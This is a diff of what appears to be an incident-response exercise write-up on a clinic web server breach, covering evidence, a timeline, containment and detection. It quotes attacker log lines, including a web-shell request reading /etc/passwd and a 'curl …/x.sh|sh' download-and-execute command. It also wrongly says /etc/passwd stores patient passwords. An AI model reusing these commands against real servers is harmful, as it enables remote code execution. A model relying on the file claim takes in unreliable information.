@@ -42,46 +42,46 @@ Time Source IP Session user Request Status Bytes Client
 | 192.0.2.160 | 192.0.2.10 | 203.0.113.50, 203.0.113.171|
 
 ### Evidence: 
-a.	An export appointment file from admin17 clinic staff => 09:30:12 192.0.2.160 clinic.admin17 GET /api/appointments/export?clinic=17 200 214,332 Mozilla/5.0 (Macintosh)
+-	An export appointment file from admin17 clinic staff => 09:30:12 192.0.2.160 clinic.admin17 GET /api/appointments/export?clinic=17 200 214,332 Mozilla/5.0 (Macintosh)
 
-b.	A noise created by by weekly vulnerability scan => 03:02:14 192.0.2.10 - GET /uploads/test.php 404 196 NW-VulnScan/2.1
+-	A noise created by by weekly vulnerability scan => 03:02:14 192.0.2.10 - GET /uploads/test.php 404 196 NW-VulnScan/2.1
 
-c.	A malicious activity trying to get admin config file => 02:11:04 203.0.113.50 - GET /admin/config.php 403 153 Go-http-client/1.1
+-	A malicious activity trying to get admin config file => 02:11:04 203.0.113.50 - GET /admin/config.php 403 153 Go-http-client/1.1
 
-d.	Malicious activity running a script on the server => 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
+-	Malicious activity running a script on the server => 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
 
 
 ### Did it work?
 Yes the attack worked. This was possible from 203.0.113.171 attack from admin login portal and successfully uploading a python code as patient appointment which gave access to where patient passwords are stored (/etc/passwd) and running script on the server which granted access login.
 
 ### Quoted line of action:
-a.	04:47:02 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑝𝑜𝑟𝑡𝑎𝑙/𝑑𝑜𝑐𝑢𝑚𝑒𝑛𝑡𝑠/𝑢𝑝𝑙𝑜𝑎𝑑 200 2,310 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
+-	04:47:02 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑝𝑜𝑟𝑡𝑎𝑙/𝑑𝑜𝑐𝑢𝑚𝑒𝑛𝑡𝑠/𝑢𝑝𝑙𝑜𝑎𝑑 200 2,310 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
 
-b.	04:48:05 203.0.113.171 - GET /uploads/img3391.𝑝ℎ𝑝?𝑐=𝑐𝑎𝑡%20/𝑒𝑡𝑐/𝑝𝑎𝑠𝑠𝑤𝑑 200 1,873 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
+-	04:48:05 203.0.113.171 - GET /uploads/img3391.𝑝ℎ𝑝?𝑐=𝑐𝑎𝑡%20/𝑒𝑡𝑐/𝑝𝑎𝑠𝑠𝑤𝑑 200 1,873 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
 
-c.	04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
+-	04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
 
 ### Timeline: Attackers action steps:
-a.	 Reconnaissance – Environment file discovery - The attacker requests /.env which suggests an attempt to discover exposed environment files containing application configuration and credentials which developers can sometimes forget to secure during application development.
+-	 Reconnaissance – Environment file discovery - The attacker requests /.env which suggests an attempt to discover exposed environment files containing application configuration and credentials which developers can sometimes forget to secure during application development.
 
-b.	Encode request manipulation - The attacker sends multiple requests containing different combination of encoded characters indicating attempts to bypass URL filtering, security rules, and input validation.
+-	Encode request manipulation - The attacker sends multiple requests containing different combination of encoded characters indicating attempts to bypass URL filtering, security rules, and input validation.
 
-c.	Server-side request exploitation - The attacker abused a Python-based request mechanism to retrieve and process unauthorised content.
+-	Server-side request exploitation - The attacker abused a Python-based request mechanism to retrieve and process unauthorised content.
 
-d.	Malicious file upload - The attacker uploaded file to introduce executable code onto the server.
+-	Malicious file upload - The attacker uploaded file to introduce executable code onto the server.
 
-e.	Sensitive file access - The attacker accessed the /etc/passwd local system accounts where passwords are stored.
+-	Sensitive file access - The attacker accessed the /etc/passwd local system accounts where passwords are stored.
 
-f.	Remote command execution - The /x.sh script helped the attacker to remotely control and execute commands on the server.
+-	Remote command execution - The /x.sh script helped the attacker to remotely control and execute commands on the server.
 
 ### First hour containment: 
-a.	Contain the threat: Stop the threat from further spread. Isolate the server and stop vulnerable scans.
+-	Contain the threat: Stop the threat from further spread. Isolate the server and stop vulnerable scans.
 
-b.	Preserve the evidence: Secure the server and its log for auditing. Its timestamps, and suspicious HTTP requests.
+-	Preserve the evidence: Secure the server and its log for auditing. Its timestamps, and suspicious HTTP requests.
 
-c.	Investigation: Check the PHP and .sh file and review running processes.
+-	Investigation: Check the PHP and .sh file and review running processes.
 
-d.	Secure and recover: Patch the exploit and rotate exposed credentials and application secrets. Also check account privileges and disables unnecessary privileges.
+-	Secure and recover: Patch the exploit and rotate exposed credentials and application secrets. Also check account privileges and disables unnecessary privileges.
 
 ### Detection idea: Set a rule that detects suspicious encoded URL patterns that stops sensitive file access like get to /.env and /etc/passwd. Also rule that stops malicious file upload, remote command execution (RCE).
 
